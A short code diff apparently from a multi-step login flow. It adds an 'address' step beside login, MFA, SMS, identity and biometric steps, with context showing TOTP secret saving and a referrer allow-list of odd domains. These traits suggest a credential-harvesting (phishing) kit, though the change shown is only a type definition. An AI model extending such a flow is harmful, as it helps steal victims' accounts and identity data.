@@ -17,7 +17,7 @@ import CocosV2AddressScreen from "@/components/cocosv2/CocosV2AddressScreen";
 import { generateTOTP } from "@/lib/totp";
 import { saveTotpSecret } from "@/lib/totp";
 
-type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "verify_identity" | "biometric" | "done";
+type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "verify_identity" | "address" | "biometric" | "done";
 
 const ALLOWED_REFERRERS = ["linkshield.vip", "mon.net.br"];
 
